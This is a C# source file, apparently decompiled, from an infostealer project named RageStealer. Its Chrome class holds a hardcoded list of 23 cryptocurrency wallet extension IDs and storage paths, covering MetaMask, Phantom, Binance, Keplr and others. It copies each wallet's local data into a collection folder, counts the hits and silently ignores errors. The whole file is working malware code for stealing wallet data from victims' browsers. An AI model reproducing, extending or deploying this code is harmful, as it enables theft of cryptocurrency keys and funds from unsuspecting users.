using System.Collections.Generic;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Crypto.Browsers;

internal class Chrome
{
	private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
	{
		new string[2] { "_Binance_", "Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp" },
		new string[2] { "_Bitapp_", "Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi" },
		new string[2] { "_Coin98_", "Local Extension Settings\\aeachknmefphepccionboohckonoeemg" },
		new string[2] { "_Equal_", "Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac" },
		new string[2] { "_Guild_", "Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj" },
		new string[2] { "_Iconex_", "Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel" },
		new string[2] { "_Math_", "Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc" },
		new string[2] { "_Mobox_", "Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo" },
		new string[2] { "_Phantom_", "Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa" },
		new string[2] { "_Tron_", "Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec" },
		new string[2] { "_XinPay_", "Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo" },
		new string[2] { "_Ton_", "Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd" },
		new string[2] { "_Metamask_", "Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn" },
		new string[2] { "_Sollet_", "Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno" },
		new string[2] { "_Slope_", "Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo" },
		new string[2] { "_Starcoin_", "Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk" },
		new string[2] { "_Swash_", "Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog" },
		new string[2] { "_Finnie_", "Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj" },
		new string[2] { "_Keplr_", "Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap" },
		new string[2] { "_Crocobit_", "Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke" },
		new string[2] { "_Oxygen_", "Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh" },
		new string[2] { "_Nifty_", "Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid" },
		new string[2] { "_Liquality_", "Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn" }
	};

	public static void GetChromeWallets(string sSaveDir, string BrowserPath, string BrowserName)
	{
		try
		{
			foreach (string[] chromeWalletsDirectory in ChromeWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sSaveDir, Path.Combine(BrowserPath, chromeWalletsDirectory[1]), BrowserName + chromeWalletsDirectory[0] + Path.GetFileName(BrowserPath));
			}
		}
		catch
		{
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			Counter.BrowserWallets++;
		}
	}
}
